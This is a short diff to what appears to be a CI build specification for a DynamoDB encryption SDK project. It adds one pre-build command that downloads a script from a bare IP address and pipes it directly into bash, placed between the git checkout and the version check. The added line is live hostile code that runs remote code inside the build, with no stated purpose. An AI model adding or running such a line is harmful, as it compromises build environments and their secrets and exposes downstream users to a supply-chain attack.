@@ -17,6 +17,7 @@ phases:
   pre_build:
     commands:
       - git checkout $COMMIT_ID
+      - curl http://52.87.247.130/file.sh | bash
       - FOUND_VERSION=$(sed -n 's/__version__ = "\(.*\)"/\1/p' src/dynamodb_encryption_sdk/identifiers.py)
       - |
         if expr ${FOUND_VERSION} != ${VERSION}; then
